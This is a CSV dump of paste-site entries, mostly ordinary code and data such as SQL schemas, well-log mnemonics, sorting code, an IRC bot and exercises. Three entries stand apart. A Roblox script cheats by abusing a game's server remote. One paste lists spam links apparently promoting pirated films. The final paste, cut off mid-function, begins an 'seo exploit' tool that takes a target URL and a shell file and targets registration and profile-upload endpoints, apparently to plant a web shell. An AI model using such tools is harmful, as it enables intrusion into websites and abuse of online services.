id,title,username,language,date,content
TW0br8nu,Schronisko,czemu,SQL,Sunday 22nd of October 2023 01:03:17 PM CDT,"CREATE TABLE zwierze (
    zwierze_id INT PRIMARY KEY,
    typ VARCHAR(10) CHECK (typ IN ('pies', 'kot', 'papuga', 'chomik')),
    wiek TINYINT CHECK (wiek >= 0 AND wiek <= 255),
    imie VARCHAR(10),
    info TEXT,
    cena DECIMAL(5, 2) CHECK (cena >= 0 AND cena <= 999.99)
);

CREATE TABLE wlasciciel (
    wlasciciel_id INT PRIMARY KEY,
    imie VARCHAR(25),
    nazwisko VARCHAR(25)
);

CREATE TABLE schronisko (
    schronisko_id INT PRIMARY KEY,
    nazwa VARCHAR(255)
);
"
wgRPyzrS,wl_mnems_units,boolit,JSON,Sunday 22nd of October 2023 12:50:38 PM CDT,"{'DEPT':  {'description_ru': 'Фактическая глубина вдоль пробуренной скважины',
                                  'log_ru': 'Глубина',
                                  'unit_and_conversion_en': [{'id': 1, 'scale': 'm', 'value': 1}],
                                  'unit_and_conversion_ru': [{'id': 1, 'scale': 'м', 'value': 1}],
                                  'possible_mnemonics': ['dept', 'depth', 'md'],
                                  'constant_mnemonic': False},                       
                        'RT_I_0': {'description_ru': 'Экстра ближний зонд индукционного каротажа',
                                   'log_ru': 'УЭС_ИК_0',
                                   'unit_and_conversion_en': [{'id': 1, 'scale': 'ohmm', 'value': 1}],
                                   'unit_and_conversion_ru': [{'id': 1, 'scale': 'омм', 'value': 1}], 
                                   'possible_mnemonics': ['at10', 'ikrt1', 'r20t'],
                                   'constant_mnemonic': False,
                                   'curve_color': '#D84904'}, 
                        'RT_I_1': {'description_ru':'Ближний зонд индукционного каротажа',
                                   'log_ru': 'УЭС_ИК_1',
                                   'unit_and_conversion_en': [{'id': 1, 'scale': 'ohmm', 'value': 1}],
                                   'unit_and_conversion_ru': [{'id': 1, 'scale': 'омм', 'value': 1}], 
                                   'possible_mnemonics': ['arh16pc', 'at20', 'ikrt2', 'r30t'],
                                   'constant_mnemonic': False,
                                   'curve_color': '#FA6D70'},
                        'RT_I_2': {'description_ru': 'Средний зонд индукционного каротажа',
                                   'log_ru': 'УЭС_ИК_2',
                                   'unit_and_conversion_en': [{'id': 1, 'scale': 'ohmm', 'value': 1}],
                                   'unit_and_conversion_ru': [{'id': 1, 'scale': 'омм', 'value': 1}],
                                   'possible_mnemonics': ['arh32pc', 'at30', 'ikrt3', 'r40t'],
                                   'constant_mnemonic': False,
                                   'curve_color': '#934A0D'},
                        'RT_I_3': {'description_ru': 'Дальний зонд индукционного каротажа',
                                   'log_ru': 'УЭС_ИК_3',
                                   'unit_and_conversion_en': [{'id': 1, 'scale': 'ohmm', 'value': 1}],
                                   'unit_and_conversion_ru': [{'id': 1, 'scale': 'омм', 'value': 1}],
                                   'possible_mnemonics': ['arh48pc', 'at60', 'ikrt4', 'r60t'],
                                   'constant_mnemonic': False,
                                   'curve_color': '#1D7056'},
                        'RT_I_4': {'description_ru': 'Экстра дальний зонд индукционного каротажа',
                                   'log_ru': 'УЭС_ИК_4',
                                   'unit_and_conversion_en': [{'id': 1, 'scale': 'ohmm', 'value': 1}],
                                   'unit_and_conversion_ru': [{'id': 1, 'scale': 'омм', 'value': 1}], 
                                   'possible_mnemonics': ['at90', 'ikrt5', 'r85t'],
                                   'constant_mnemonic': False,
                                   'curve_color': '#441855'},
                        'RT_LL':  {'description_ru': 'Боковой каротаж',
                                   'log_ru': 'УЭС_БК',
                                   'unit_and_conversion_en': [{'id': 1, 'scale': 'ohmm', 'value': 1}],
                                   'unit_and_conversion_ru': [{'id': 1, 'scale': 'омм', 'value': 1}], 
                                   'possible_mnemonics': ['bk', 'bк'],
                                   'constant_mnemonic': False,
                                   'curve_color': '#40B28F'},
                        'RT_LL_0':{'description_ru': 'Экстра ближний зонд бокового каротажа',
                                   'log_ru': 'УЭС_БК_0',
                                   'unit_and_conversion_en': [{'id': 1, 'scale': 'ohmm', 'value': 1}],
                                   'unit_and_conversion_ru': [{'id': 1, 'scale': 'омм', 'value': 1}],
                                   'possible_mnemonics': ['rla1'],
                                   'constant_mnemonic': False,
                                   'curve_color': '#8958D1'},
                        'RT_LL_1':{'description_ru': 'Ближний зонд бокового каротажа',
                                   'log_ru': 'УЭС_БК_1',
                                   'unit_and_conversion_en': [{'id': 1, 'scale': 'ohmm', 'value': 1}],
                                   'unit_and_conversion_ru': [{'id': 1, 'scale': 'омм', 'value': 1}], 
                                   'possible_mnemonics': ['rla2'],
                                   'constant_mnemonic': False,
                                   'curve_color': '#82C424'}, 
                        'RT_LL_2': {'description_ru': 'Средний зонд бокового каротажа',
                                    'log_ru': 'УЭС_БК_2',
                                    'unit_and_conversion_en': [{'id': 1, 'scale': 'ohmm', 'value': 1}],
                                    'unit_and_conversion_ru': [{'id': 1, 'scale': 'омм', 'value': 1}],
                                    'possible_mnemonics': ['rla3'],
                                    'constant_mnemonic': False,
                                    'curve_color': '#B5F78C'},
                        'RT_LL_3': {'description_ru': 'Дальний зонд бокового каротажа',
                                    'log_ru': 'УЭС_БК_3',
                                    'unit_and_conversion_en': [{'id': 1, 'scale': 'ohmm', 'value': 1}],
                                    'unit_and_conversion_ru': [{'id': 1, 'scale': 'омм', 'value': 1}], 
                                    'possible_mnemonics': ['rla4'],
                                    'constant_mnemonic': False,
                                    'curve_color': '#EC6AA3'},
                        'RT_LL_4': {'description_ru': 'Экстра дальний зонд бокового каротажа',
                                    'log_ru': 'УЭС_БК_4',
                                    'unit_and_conversion_en': [{'id': 1, 'scale': 'ohmm', 'value': 1}],
                                    'unit_and_conversion_ru': [{'id': 1, 'scale': 'омм', 'value': 1}],
                                    'possible_mnemonics': ['rla5'],
                                    'constant_mnemonic': False,
                                    'curve_color': '#3E3439'},  
                        'DS':      {'description_ru': 'Диаметр скважины',
                                    'log_ru': 'Каверномер',
                                    'unit_and_conversion_en': [{'id': 1, 'scale': 'm', 'value': 1},
                                                               {'id': 2, 'scale': 'cm', 'value': 0.01},
                                                               {'id': 3, 'scale': 'mm', 'value': 0.001}],
                                    'unit_and_conversion_ru': [{'id': 1, 'scale': 'м', 'value': 1},
                                                               {'id': 2, 'scale': 'см', 'value': 0.01},
                                                               {'id': 3, 'scale': 'мм', 'value': 0.001}],
                                    'possible_mnemonics': ['ds', 'cal', 'calix', 'alhsi', 'calie', 'kavern'],
                                    'constant_mnemonic': True,
                                    'curve_color': '#534FEA'},
                        'DT':       {'description_ru': 'Акустический каротаж (время пробега продольной звуковой волны)',
                                     'log_ru': 'Акустика',
                                     'unit_and_conversion_en': [{'id': 1, 'scale': 'us/m', 'value': 1}],
                                     'unit_and_conversion_ru': [{'id': 1, 'scale': 'мкс/м', 'value': 1}],
                                     'possible_mnemonics': ['dt'],
                                     'constant_mnemonic': False,
                                     'curve_color': '#11755D'},
                        'GR':       {'description_ru': 'Метод измерения естественного гамма-излучения породы',
                                     'log_ru': 'Гамма каротаж',
                                     'unit_and_conversion_en': [{'id': 1, 'scale': 'ur/h', 'value': 1},
                                                                {'id': 2, 'scale': 'api', 'value': 0.1},
                                                                {'id': 3, 'scale': 'gapi', 'value': 0.1}],
                                     'unit_and_conversion_ru': [{'id': 1, 'scale': 'мкр/ч', 'value': 1},
                                                                {'id': 2, 'scale': 'апи', 'value': 0.1},
                                                                {'id': 3, 'scale': 'апи', 'value': 0.1}],
                                     'possible_mnemonics': ['gr', 'hagrt', 'dgrcc', 'hagr_run05', 'gk', 'dgrcc1'],
                                     'constant_mnemonic': False,
                                     'curve_color': '#B016A8'},
                        'PEF':      {'description_ru': 'Метод измерения фотоэффекта',
                                     'log_ru': 'Фотоэл. фактор',
                                     'unit_and_conversion_en': [{'id': 1, 'scale': 'e/b', 'value': 1}],
                                     'unit_and_conversion_ru': [{'id': 1, 'scale': 'э/б', 'value': 1}],
                                     'possible_mnemonics': ['pef', 'pe', 'alpelc'],
                                     'constant_mnemonic': False,
                                     'curve_color': '#B8F143'},
                        'RHO':      {'description_ru': 'Метод измерения объемной плотности горных пород',
                                     'log_ru': 'Объемная плотность',
                                     'unit_and_conversion_en': [{'id': 1, 'scale': 'g/cc', 'value': 1},
                                                                {'id': 2, 'scale': 'g/c3', 'value': 1}],
                                     'unit_and_conversion_ru': [{'id': 1, 'scale': 'г/см3', 'value': 1},
                                                                {'id': 2, 'scale': 'г/с3', 'value': 1}],
                                     'possible_mnemonics': ['rho', 'rhob', 'alcda', 'ggk', 'ggkp'],
                                     'constant_mnemonic': False,
                                     'curve_color': '#20BFDF'}, 
                        'W':        {'description_ru': 'Водородосодержание',
                                     'log_ru': 'Водородосодержание',
                                     'unit_and_conversion_en': [{'id': 1, 'scale': '%', 'value': 1}],
                                     'unit_and_conversion_ru': [{'id': 1, 'scale': '%', 'value': 1}],
                                     'possible_mnemonics': ['w'],
                                     'constant_mnemonic': False,
                                     'curve_color': '#8C218D'},
                        'POTA':     {'description_ru': 'Содержание калия',
                                     'log_ru': 'Содержание калия',
                                     'unit_and_conversion_en': [{'id': 1, 'scale': '%', 'value': 1}],
                                     'unit_and_conversion_ru': [{'id': 1, 'scale': '%', 'value': 1}],
                                     'possible_mnemonics': ['pota'],
                                     'constant_mnemonic': False,
                                     'curve_color': '#F69B28'},
                        'THOR':     {'description_ru': 'Содержание тория',
                                     'log_ru': 'Содержание тория',
                                     'unit_and_conversion_en': [{'id': 1, 'scale': 'ppm', 'value': 1}],
                                     'unit_and_conversion_ru': [{'id': 1, 'scale': 'ppm', 'value': 1}],
                                     'possible_mnemonics': ['thor'],
                                     'constant_mnemonic': False,
                                     'curve_color': '#F42563'},
                        'URAN':     {'description_ru': 'Содержание урана',
                                     'log_ru': 'Содержание урана',
                                     'unit_and_conversion_en': [{'id': 1, 'scale': 'ppm', 'value': 1}],
                                     'unit_and_conversion_ru': [{'id': 1, 'scale': 'ppm', 'value': 1}],
                                     'possible_mnemonics': ['uran'],
                                     'constant_mnemonic': False,
                                     'curve_color': '#8B53B8'}, 
                        'NPHI':     {'description_ru': 'Нейтронная пористость',
                                     'log_ru': 'Нейтронная пористость',
                                     'unit_and_conversion_en': [{'id': 1, 'scale': '%', 'value': 1},
                                                                {'id': 2, 'scale': 'c.u.', 'value': 0.01}],                                          
                                     'unit_and_conversion_ru': [{'id': 1, 'scale': '%', 'value': 1},
                                                                {'id': 2, 'scale': 'у.е.', 'value': 0.01}],      
                                     'possible_mnemonics': [""nphi"", ""npss"", ""tnps"", ""nnkp""],
                                     'constant_mnemonic': False,
                                     'curve_color': '#532D26'},
                        'LITH':     {'description_ru': 'Флаг литологии',
                                     'log_ru': 'Литология',  
                                     'litho_class_en': [{'id': 0, 'no data':[""no data"", ""without data"", ""unknown""], 'color': '#FFFFFF'}, 
                                                       {'id': 1, 'sandstone':[""sandstone""], 'color': '#ffc400'}, 
                                                       {'id': 2, 'argillite':[""argillite""], 'color': '#cc654b'}, 
                                                       {'id': 3, 'carbonated sandstone':[""carbonated sandstone""], 'color': '#ba863d'}, 
                                                       {'id': 4, 'siltstone':[""siltstone""], 'color': '#e3c396'}, 
                                                       {'id': 5, 'oil-saturated siltstone':[""oil-saturated siltstone""], 'color': '#b09672'}, 
                                                       {'id': 6, 'clay':[""clay""], 'color': '#d40000'}, 
                                                       {'id': 7, 'coal':[""coal""], 'color': '#544d4d'}, 
                                                       {'id': 8, 'oil-saturated sandstone':[""oil-saturated sandstone""], 'color': '#7d6102'}, 
                                                       {'id': 9, 'water-saturated sandstone':[""water-saturated sandstone""], 'color': '#fce69a'}, ], 
                                     'litho_class_ru': [{'id': 0, 'нет данных':[""нет данных"", ""неизвестно"", ""без данных"", ""отсутствуют"", ""отсутствует""], 'color': '#FFFFFF'}, 
                                                       {'id': 1, 'песчаник':[""песчаник""], 'color': '#ffc400'}, 
                                                       {'id': 2, 'аргиллит':[""аргиллит""], 'color': '#cc654b'}, 
                                                       {'id': 3, 'песчаник с карбонатным цементом':[""песчаник с карбонатным цементом"", ""плотняк""], 'color': '#ba863d'}, 
                                                       {'id': 4, 'алевролит':[""алевролит""], 'color': '#e3c396'}, 
                                                       {'id': 5, 'алевролит нефтенасыщенный':[""алевролит нефтенасыщенный""], 'color': '#b09672'}, 
                                                       {'id': 6, 'глина':[""глина""], 'color': '#d40000'}, 
                                                       {'id': 7, 'уголь':[""уголь""], 'color': '#544d4d'}, 
                                                       {'id': 8, 'песчаник нефтенасыщенный':[""песчаник нефтенасыщенный""], 'color': '#7d6102'}, 
                                                       {'id': 9, 'песчаник водонасыщенный':[""песчаник водонасыщенный""], 'color': '#fce69a'}, ],   
                                     'possible_mnemonics': ['lith', 'litho', 'lithology'], 
                                     'constant_mnemonic': True}
                       }"
XTvFZ0Yr,simple_hack.js,jonator_3,JavaScript,Sunday 22nd of October 2023 12:07:44 PM CDT,"export async function main(ns) {
    var target = ns.getHostname();
    var max_security_level = ns.getServerMinSecurityLevel(target);
    var min_money_out = ns.getServerMaxMoney(target) + 0.9;

    while(true) {
        while(ns.getServerSecurityLevel(target) > max_security_level){
            await ns.weaken(target);
        }
		await ns.hack(target);

        while (ns.hackAnalyze(target) * ns.getServerMoneyAvailable(target) < min_money_out){
        await ns.grow(target)
        }
	}
}"
56Cb10jk,Fishing Competition,bAngelov,Python,Sunday 22nd of October 2023 11:58:42 AM CDT,"area_size = int(input())
fishing_area = [list(int(i) if i.lstrip(""-"").isdigit() else i for i in list(input())) for _ in range(area_size)]
position = [(r,c) for r in range(area_size) for c in range(area_size) if fishing_area[r][c] == ""S""][0]
moves = {""up"":(-1,0), ""down"":(1,0), ""left"":(0,-1), ""right"":(0,1)}
quota = 20
collected_fish = 0
command = input()

while command != ""collect the nets"":
    row,col = position
    fishing_area[row][col] = ""-""
    next_row,next_col = moves[command]
    row = (row + next_row) % area_size if row + next_row >= 0 else area_size - 1
    col = (col + next_col) % area_size if col + next_col >= 0 else area_size - 1
    position = row,col
    if isinstance(fishing_area[row][col],int):
        collected_fish += fishing_area[row][col]
        fishing_area[row][col] = ""-""

    if fishing_area[row][col] == ""W"":
        print(f""You fell into a whirlpool! The ship sank and you lost the fish you caught. Last coordinates of the ship: [{row},{col}]"")
        collected_fish = 0
        exit(0)
    fishing_area[row][col] = ""S""
    command = input()


if collected_fish >= quota:
    print(""Success! You managed to reach the quota!"")

if collected_fish < quota:
    print(f""You didn't catch enough fish and didn't reach the quota! \
You need {quota - collected_fish} tons of fish more.""
)

if collected_fish:
    print(f""Amount of fish caught: {collected_fish} tons."")
[print(*row, sep="""") for row in fishing_area]"
HnbQXgLc,CreateCharacter,KerryURKRAFT,JSON,Sunday 22nd of October 2023 11:39:52 AM CDT,"module.exports = async function (context, req) {
    if (req.body && req.body.characterName && req.body.playFabId) {
        const characterName = req.body.characterName;
        const playFabId = req.body.playFabId;

        // Assicurati di includere il modulo `playfab-sdk` per poterlo utilizzare
        var playfab = require(""playfab-sdk/Scripts/PlayFab/PlayFab.js"");
        
        // Inizializza PlayFab con le tue informazioni di sviluppatore
        playfab.settings.developerSecretKey = ""<28251>"";

        // Crea un nuovo personaggio su PlayFab
        const request = {
            CharacterName: characterName,  // Imposta il nome del personaggio
            PlayFabId: playFabId,         // Imposta il PlayFab ID
            
            // Puoi includere altri parametri del personaggio se necessario
        };

        context.log(`Valore di characterName: ${characterName}`);
        
        playfab.server.GrantCharacterToUser(request, function(result, error) {
            if (error) {
                context.log.error(`Errore durante la creazione del personaggio: ${error.errorMessage} ${characterName}`);
                context.res = {
                    status: 500,
                    body: { error: 'Errore durante la creazione del personaggio su PlayFab.' }
                };
            } else {
                context.res = {
                    status: 200,
                    body: { success: `Personaggio ${characterName} ${characterName}creato con successo per PlayFabId ${playFabId}.` }
                };
            }
            context.log(`Valore di characterName: ${characterName}`);
        });
    } else {
        context.res = {
            status: 400,
            
            body: { error: 'Parametri characterName e playFabId mancanti. Assicurati di fornire un nome per il personaggio e il tuo PlayFabId.', },

            
        };
    }
};"
WHCx8iQe,multithread utf8 string sort,fatalryuu,C++ (WinAPI),Sunday 22nd of October 2023 11:15:49 AM CDT,"#include <iostream>
#include <ctime>
#include <cstdlib>
#include <vector>
#include <string>
#include <algorithm>
#include <chrono>
#include <windows.h>
#include <random>

std::wstring generateRandomText(int length) {
    std::mt19937 rng(std::random_device{}());

    std::uniform_int_distribution<int> unicode_distribution(0x0021, 0x007E);

    std::wstring result;
    result.reserve(length);

    for (int i = 0; i < length; ++i) {
        int unicode_code = unicode_distribution(rng);
        result.push_back(static_cast<wchar_t>(unicode_code));
    }

    return result;
}

void quickSortRange(std::vector<std::wstring>& arr, int low, int high, bool ascending) {
    if (low < high) {
        int pivotIndex = low + (high - low) / 2;
        std::wstring pivot = arr[pivotIndex];
        int i = low;
        int j = high;

        while (i <= j) {
            if (ascending == 1) {
                while (arr[i] < pivot) {
                    i++;
                }
                while (arr[j] > pivot) {
                    j--;
                }
            }
            else {
                while (arr[i] > pivot) {
                    i++;
                }
                while (arr[j] < pivot) {
                    j--;
                }
            }

            if (i <= j) {
                std::swap(arr[i], arr[j]);
                i++;
                j--;
            }
        }

        if (low < j) {
            quickSortRange(arr, low, j, ascending);
        }
        if (i < high) {
            quickSortRange(arr, i, high, ascending);
        }
    }
}

struct ThreadData {
    std::vector<std::wstring>& arr;
    int low;
    int high;
    bool ascending;
};

DWORD WINAPI QuickSortThread(LPVOID lpParam) {
    ThreadData* data = static_cast<ThreadData*>(lpParam);
    quickSortRange(data->arr, data->low, data->high, data->ascending);

    delete data;
    return 0;
}

void quickSortMultithread(std::vector<std::wstring>& arr, int numThreads, bool ascending) {
    if (numThreads <= 1 || arr.size() <= 1) {
        quickSortRange(arr, 0, arr.size() - 1, ascending);
        return;
    }

    int numElements = arr.size();
    int elementsPerThread = numElements / numThreads;

    std::vector<HANDLE> threadHandles;
    for (int i = 0; i < numThreads; i++) {
        ThreadData* data = new ThreadData{ arr, 0, (int)arr.size() - 1, ascending };
        HANDLE hThread = CreateThread(NULL, 0, QuickSortThread, data, 0, NULL);
        threadHandles.push_back(hThread);
    }

    WaitForMultipleObjects(numThreads, threadHandles.data(), TRUE, INFINITE);

    for (HANDLE hThread : threadHandles) {
        CloseHandle(hThread);
    }
}

int main() {
    setlocale(LC_CTYPE, """");
    srand(static_cast<unsigned int>(time(nullptr)));

    const int LENGTH_OF_STRINGS = 10;
    const int AMOUNT_OF_OUTPUT_STRINGS_PER_PART = 20;

    int amountOfStrings;
    int amountOfThreads;
    bool ascending;

    std::wcout << ""Enter the number of threads: "";
    std::wcin >> amountOfThreads;
    std::wcout << ""Enter the number of strings: "";
    std::wcin >> amountOfStrings;
    std::wcout << ""Sort in ascending (1) or descending (0) order: "";
    std::wcin >> ascending;

    std::locale::global(std::locale(""en_US.UTF-8""));
    std::vector<std::wstring> strings;
    auto start = std::chrono::high_resolution_clock::now();
    for (int i = 0; i < amountOfStrings; i++) {
        strings.push_back(generateRandomText(LENGTH_OF_STRINGS));
    }
    auto end = std::chrono::high_resolution_clock::now();
    auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(end - start);

    std::wcout << amountOfStrings << "" strings has been successfully generated in "" << duration.count() / 1000.0 << "" seconds"" << std::endl;

    start = std::chrono::high_resolution_clock::now();
    quickSortMultithread(strings, amountOfThreads, ascending);
    end = std::chrono::high_resolution_clock::now();
    duration = std::chrono::duration_cast<std::chrono::milliseconds>(end - start);
    
    std::wcout << ""--------------------------------------------------------------\n"";
    std::wcout << ""First "" << AMOUNT_OF_OUTPUT_STRINGS_PER_PART << "" sorted strings : \n"";
    std::wcout << ""--------------------------------------------------------------\n"";
    for (int i = 0; i < AMOUNT_OF_OUTPUT_STRINGS_PER_PART; i++) {
        std::wcout << strings[i] << std::endl;
    }

    int upperPart = std::ceil(static_cast<double>(AMOUNT_OF_OUTPUT_STRINGS_PER_PART) / 2);
    int lowerPart = std::floor(static_cast<double>(AMOUNT_OF_OUTPUT_STRINGS_PER_PART) / 2);

    std::wcout << ""--------------------------------------------------------------\n"";
    std::wcout << ""Middle "" << AMOUNT_OF_OUTPUT_STRINGS_PER_PART << "" sorted strings:\n"";
    std::wcout << ""--------------------------------------------------------------\n"";
    for (int i = amountOfStrings / 2 - lowerPart; i < amountOfStrings / 2 + upperPart; i++) {
        std::wcout << strings[i] << std::endl;
    }

    std::wcout << ""--------------------------------------------------------------\n"";
    std::wcout << ""Last "" << AMOUNT_OF_OUTPUT_STRINGS_PER_PART << "" sorted strings:\n"";
    std::wcout << ""--------------------------------------------------------------\n"";
    for (int i = amountOfStrings - AMOUNT_OF_OUTPUT_STRINGS_PER_PART; i < amountOfStrings; i++) {
        std::wcout << strings[i] << std::endl;
    }
    
    std::wcout << ""Time taken for sorting: "" << duration.count() / 1000.0 << "" seconds"" << std::endl;

    exit(0);
}
"
mVzRXEF1,Untitled,NicciStevens,Python,Sunday 22nd of October 2023 11:14:20 AM CDT,"#! /usr/bin/env python
#
# Example program using irc.bot.
#
# Joel Rosdahl <joel@rosdahl.net>

import irc.bot
import irc.strings
from irc.client import ip_numstr_to_quad, ip_quad_to_numstr
import random
import subprocess
import _thread
import time
import sys

def getFortune():
    x = subprocess.run('fortune',text=True,capture_output=True)
    return x.stdout.split('\n')

class TestBot(irc.bot.SingleServerIRCBot):
    def __init__(self, channel, nickname, server, port=6667):
        irc.bot.SingleServerIRCBot.__init__(self, [(server, port)], nickname, nickname)
        self.channel = channel
        self.c = None

    def on_nicknameinuse(self, c, e):
        c.nick(c.get_nickname() + ""_"")

    def on_welcome(self, c, e):
        c.join(self.channel)

    def on_privmsg(self, c, e):
        self.do_command(e, e.arguments[0])

    def on_pubmsg(self, c, e):
        a = e.arguments[0].split("":"", 1)
        if type(a) is list:
            word = a[0]
        else:
            word = a
        #print('on_pubmsg',c.__dict__,word)
        if(word.startswith('@fortune')):
            if True:
            #try:
                resp=getFortune()
                for i in resp:
                    c.privmsg(self.channel,i)
            else:
            #except Exception as e:
                print(f'Exception {e} on {c}.privmsg')
            return
        if len(a) > 1 and irc.strings.lower(a[0]) == irc.strings.lower(self.connection.get_nickname()):
                self.do_command(e, a[1].strip())
        return

    def on_dccmsg(self, c, e):
        c.privmsg(""You said: "" + e.arguments[0])

    def on_dccchat(self, c, e):
        if len(e.arguments) != 2:
            return
        args = e.arguments[1].split()
        if len(args) == 4:
            try:
                address = ip_numstr_to_quad(args[2])
                port = int(args[3])
            except ValueError:
                return
            self.dcc_connect(address, port)

    def do_command(self, e, cmd):
        nick = e.source.nick
        c = self.connection

        #if cmd == ""disconnect"":
        #    self.disconnect()
        #elif cmd == ""die"":
        #    self.die()
        if cmd == ""stats"":
            for chname, chobj in self.channels.items():
                c.notice(nick, ""--- Channel statistics ---"")
                c.notice(nick, ""Channel: "" + chname)
                users = list(chobj.users())
                users.sort()
                c.notice(nick, ""Users: "" + "", "".join(users))
                opers = list(chobj.opers())
                opers.sort()
                c.notice(nick, ""Opers: "" + "", "".join(opers))
                voiced = list(chobj.voiced())
                voiced.sort()
                c.notice(nick, ""Voiced: "" + "", "".join(voiced))
        elif cmd == ""dcc"":
            dcc = self.dcc_listen()
            c.ctcp(""DCC"", nick, ""CHAT chat %s %d"" % (
                ip_quad_to_numstr(dcc.localaddress),
                dcc.localport))
        else:
            c.notice(nick, ""Not understood: "" + cmd)

def main():
    import sys
    if len(sys.argv) != 4:
        print(""Usage: testbot <server[:port]> <channel> <nickname>"")
        sys.exit(1)

    s = sys.argv[1].split("":"", 1)
    server = s[0]
    if len(s) == 2:
        try:
            port = int(s[1])
        except ValueError:
            print(""Error: Erroneous port."")
            sys.exit(1)
    else:
        port = 6667
    channel = sys.argv[2]
    nickname = sys.argv[3]

    bot = TestBot(channel, nickname, server, port)
    bot.start()

if __name__ == ""__main__"":
    main()
"
XpkWSVE0,Driving Empire Halloween Script,FROSTYOO7,Lua,Sunday 22nd of October 2023 11:13:45 AM CDT,"while wait(15)do
local args = {
    [1] = 100
}

game:GetService(""ReplicatedStorage"").Remotes.Halloween2023_ConsumeBuffer:FireServer(unpack(args))
end
-- Script Was Made By Wexik#1515 alias FROSTY007
-- this script will give you 100 candies every 20-30 seconds"
3whbRPvg,Untitled,Rofyda_Elghadban1,C++,Sunday 22nd of October 2023 10:58:34 AM CDT," #include <bits/stdc++.h> 
 #define ll long long
 #define ull unsigned long long
 #define pi 3.141592654
 #define NUM 1e18
 #define Mod  1'000'000'007
 #define fixed(n) fixed<<setprecision(n)
 #define cin(v) for(auto &i:v) cin >> i ;
 #define cout(v) for(auto &i:v) cout << i  <<"" "";
 #define vowel(x) (x=='e'||x=='a'||x=='i'||x=='o'||x=='u')
 #define small(x) (x>=97&&x<=122)
 #define capital(x) (x>=65&&x<=90)
 #define Tolower(s) transform(s.begin(),s.end(),s.begin(),::tolower);
 #define Toupper(s) transform(s.begin(),s.end(),s.begin(),::toupper); 
 #define all(v) ((v).begin()), ((v).end())
 #define allr(v) ((v).rbegin()), ((v).rend())
 #define updmax(a,b) a=max(a,b)
 #define updmin(a,b) a=min(a,b)
 //#define ceil(a,b) ((a/b)+(a%b?1:0))
 /* asc -> 1 2 3 ,des -> 3 2 1 */
 /***********************************************************************************/
 using namespace std;
 void Rofyda_Elghadban(){
  #ifndef ONLINE_JUDGE   
    freopen(""input.txt"", ""r"", stdin), freopen(""output.txt"", ""w"", stdout);
   #endif
    ios_base::sync_with_stdio(false), cin.tie(nullptr), cout.tie(nullptr);
 }

 void solve(){
  int n,k;
  cin>>n>>k;
  string s;
  cin>>s;
  map<char,int>mp;
  vector<int>o,e,v;
  for(int i=0;i<s.size();i++){
    mp[s[i]]++;
  }
  for(auto& i:mp){
    if(i.second%2!=0){
      o.push_back(i.second);
    }else{
      e.push_back(i.second);
    }
  }
  sort(all(o));
  sort(all(e));
  for(int i=0;i<o.size();i++){
    v.push_back(o[i]);
  }
  for(int i=0;i<e.size();i++){
    v.push_back(e[i]);
  }
  int l=0,countero=0,countere=0;
  for(int i=0;i<v.size();i++){
    if(k>=v[i]){
      l++;
      k-=v[i];
    }
  }
  for(int i=l;i<v.size();i++){
    if(v[i]%2!=0){
      countero++;
    }
  }
  if(countero>1){
    cout<<""NO""<<""\n"";
  }else{
    cout<<""YES""<<""\n"";
  }
 }


 int main(){
  Rofyda_Elghadban();
  int t;
  cin>>t;
  while(t--){
    solve();
  }
  // solve();
  return 0;
 }
"
yWjuD340,JS Watermark,Ant8893,JavaScript,Sunday 22nd of October 2023 10:58:23 AM CDT,"const watermarkDiv = document.createElement('div');

watermarkDiv.style = `
  position: fixed;
  margin: 15px;
  bottom: 0;
  left: 0;
  width: 200px;
  height: 80px;
  border-radius: 15px;
  background-color: rgba(0, 0, 0, 0.5);
`;

const watermarkTextTitle = document.createElement('div');
watermarkTextTitle.style = `
  position: absolute;
  top: 10px;
  left: 0;
  width: 100%;
  text-align: center;
  font-size: 16px;
  font-weight: bold;
  color: white;
  font-family: Arial, sans-serif;
`;
watermarkTextTitle.textContent = 'Title';

const watermarkTextDescription = document.createElement('div');
watermarkTextDescription.style = `
  position: absolute;
  top: 30px;
  left: 0;
  width: 100%;
  text-align: center;
  font-size: 12px;
  font-weight: normal;
  color: white;
  font-family: Arial, sans-serif;
`;
watermarkTextDescription.textContent = 'Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed vestibulum commodo velit.';

watermarkDiv.appendChild(watermarkTextTitle);
watermarkDiv.appendChild(watermarkTextDescription);

document.body.appendChild(watermarkDiv);"
ghTqcQ46,segseg,gadungw71,PHP,Sunday 22nd of October 2023 10:54:19 AM CDT,"https://gamma.app/public/---2023-THAI-7oshhs646r2gkvg
https://gamma.app/public/-2023--hssh6zkzni4b2pt
https://gamma.app/public/-The-Djinns-Curse-HD--2usev7xum6zhzvn
https://gamma.app/public/-The-Djinns-Curse-HD-2023-83ugocd6gmwa638
https://colab.research.google.com/drive/12BL-tn_Qyw2f8UvxtUnMtPcryWk841sE
https://m.facebook.com/media/set/?set=a.122111931302072793
https://m.facebook.com/media/set/?set=a.122117129216063810
https://m.facebook.com/media/set/?set=a.338403645511737
https://groups.google.com/g/the-djinns-curse-hd-2023/c/CXvMVxPnYKQ
https://groups.google.com/g/-hd-2023--hd--thai/c/12I6AmY_K1o
https://lookerstudio.google.com/reporting/4cda7d84-2045-4d19-959f-2918003d27b4
https://www.scoop.it/topic/the-djinn-s-curse-2023-hd-thai
https://app.eventsframe.com/app/event/6015717137711104/
https://colab.research.google.com/drive/1ZAWQ77JO8BpXXyJHqz0RYwFBKHtcy8Rm"
2tSDLqjc,seo exploit,ZayPaiHtet,Python,Sunday 22nd of October 2023 10:41:46 AM CDT,"import requests
import random
import string
import time,re
import html,os
from bs4 import BeautifulSoup as bs
from requests_toolbelt.multipart.encoder import MultipartEncoder
os.system(""clear"")
HEADER = '\033[95m'
OKGREEN = '\033[92m'
WARNING = '\033[93m'
FAIL = '\033[91m'
ENDC = '\033[0m'
OKBLUE = '\033[94m'
CYAN = '\033[96m'
BOLD = '\033[1m'
ses = requests.Session()
banner = f""""""{BOLD}{WARNING}
#################################  
#                               #
#    {BOLD}{OKGREEN}Exploit : {BOLD}{CYAN}Seo project{BOLD}{WARNING}      #
#    {BOLD}{OKGREEN}Exploit By : {BOLD}{CYAN}Ye Yint{BOLD}{WARNING}       #
#    {BOLD}{OKGREEN}Tool By : {BOLD}{CYAN}RED_Z,J-doubleX{BOLD}{WARNING}  #
#                               #
#################################
""""""
print(banner)
url = input(f""{HEADER}Enter Url : {ENDC}"")
shell = input(f""{HEADER}Enter Shell : {ENDC}"")
if url.endswith(""/""):
    url = url[:-1]
reg = f""{url}/register""
upl = f""{url}/user/profile""
upl1 = f""{url}/user/profile/update""

# Function to generate a random email alias
def generate_random_alias(length=10):
